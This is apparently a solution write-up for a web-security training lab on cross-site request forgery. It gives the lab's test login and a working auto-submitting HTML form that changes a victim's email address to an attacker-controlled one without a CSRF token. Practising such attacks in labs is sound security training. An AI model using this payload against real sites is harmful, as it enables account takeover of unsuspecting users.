This lab's email change functionality is vulnerable to CSRF.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You can log in to your own account using the following credentials: wiener:peter 

# Solution

Remove CSRF token when changing email

```html
<form id="autosubmit" action="https://0ac400ae04d5c12f80c87b54004f0069.web-security-academy.net/my-account/change-email" enctype="application/x-www-form-urlencoded" method="POST">
 <input name="email" type="hidden" value="some-other-email@attacker.com" />
 <input type="submit" value="Submit Request" />
</form>
 
<script>
 document.getElementById("autosubmit").submit();
</script>
```